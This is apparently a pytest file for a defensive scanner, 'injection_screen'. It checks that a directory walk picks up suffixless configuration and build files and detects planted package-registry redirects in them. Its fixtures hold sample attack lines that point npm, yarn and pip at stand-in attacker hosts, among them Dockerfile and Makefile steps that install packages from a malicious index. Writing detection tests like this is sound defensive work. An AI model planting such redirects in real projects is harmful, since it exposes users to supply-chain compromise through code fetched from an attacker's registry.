"""A directory walk reads well-known configuration and build files that have no suffix it
knows (`.npmrc`, `Dockerfile`, `.env`, ...): a registry redirect planted there was skipped by a
walk at exit 0."""
import pytest
from injection_screen import surfaces
from injection_screen.pipeline import run


@pytest.mark.parametrize("name,body", [
    (".npmrc", "registry=https://npm.attacker.example/\n"),
    (".yarnrc", 'registry "https://npm.attacker.example/"\n'),
    ("pip.conf", "[global]\nindex-url = https://pypi.attacker.example/simple\n"),
    ("Dockerfile", "FROM python:3.12\nRUN pip install -i https://pypi.attacker.example/simple x\n"),
    ("Dockerfile.dev", "RUN pip install -i https://pypi.attacker.example/simple x\n"),
    ("Makefile", "setup:\n\tpip install -i https://pypi.attacker.example/simple x\n"),
])
def test_a_registry_redirect_in_a_named_file_is_found_by_a_walk(tmp_path, name, body):
    d = tmp_path / "dl"
    d.mkdir()
    (d / name).write_text(body)
    res = run(surfaces.collect([d]).files, "untrusted-web", session=False)
    assert any(f["kind"] == "registry-redirect" for f in res["findings"]), res


@pytest.mark.parametrize("name", [".npmrc", ".yarnrc", ".pypirc", "pip.conf", ".condarc",
                                  "Dockerfile", "Dockerfile.prod", "Containerfile", "Makefile",
                                  "GNUmakefile", "Jenkinsfile", "Procfile", "justfile", ".env",
                                  ".env.local", ".envrc", ".bashrc", ".zshrc", ".profile",
                                  ".bash_profile"])
def test_the_named_files_are_collected(tmp_path, name):
    (tmp_path / name).write_text("x\n")
    en = surfaces.collect([tmp_path])
    assert [p.name for p in en.files] == [name] and en.skipped_by_suffix == 0


@pytest.mark.parametrize("name", ["LICENSE", "notes", "data.csv", "image.png", "Dockerfile.png"])
def test_other_files_are_still_skipped_and_counted(tmp_path, name):
    (tmp_path / name).write_text("x\n")
    en = surfaces.collect([tmp_path])
    assert en.files == [] and en.skipped_by_suffix == 1
